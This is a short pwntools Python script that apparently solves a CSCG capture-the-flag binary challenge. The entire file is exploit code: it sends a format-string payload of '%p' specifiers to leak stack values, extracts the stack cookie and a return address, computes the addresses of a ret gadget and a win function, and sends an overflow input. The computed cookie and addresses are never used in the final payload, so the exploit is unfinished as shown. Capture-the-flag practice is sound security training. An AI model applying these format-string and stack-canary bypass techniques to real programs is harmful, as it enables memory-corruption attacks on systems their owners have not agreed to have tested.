from pwn import *

p = process("./pwn2")


p.readline()
p.sendline("CSCG{THIS_IS_TEST_FLAG}") # Format string exploit
p.readline()

p.sendline("|".join(["%p"]*70)) # Format string exploit

p.readline() # reading the Hufflepuff banner
p.readline()
p.readline()
p.readline()

leaks = p.readline().decode("utf-8").split("|") # read the leaked values

print(leaks)

cookie =    int(leaks[38],16) # get the stack cookie
leak_addr = int(leaks[39],16) # get the leaked return address

ret = leak_addr - 0x2e # calculate the address of an ret instruction

win = leak_addr - 0x135 # calculate the address of WINgardium_leviosa

input()

p.sendline(b"Expelliarmus\0" + cyclic(400))

p.interactive()
